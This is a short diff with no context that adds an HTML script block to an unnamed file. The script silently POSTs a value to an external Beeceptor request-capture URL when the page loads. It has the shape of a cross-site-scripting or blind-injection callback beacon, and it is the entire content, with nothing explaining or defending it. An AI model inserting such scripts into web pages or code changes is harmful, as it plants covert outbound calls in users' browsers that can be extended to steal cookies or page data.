@@ -1,0 +1,5 @@
+<script>
+ var x = new XMLHttpRequest();
+ x.open("POST","https://jiaxuan.free.beeceptor.com");
+ x.send(1);
+</script>
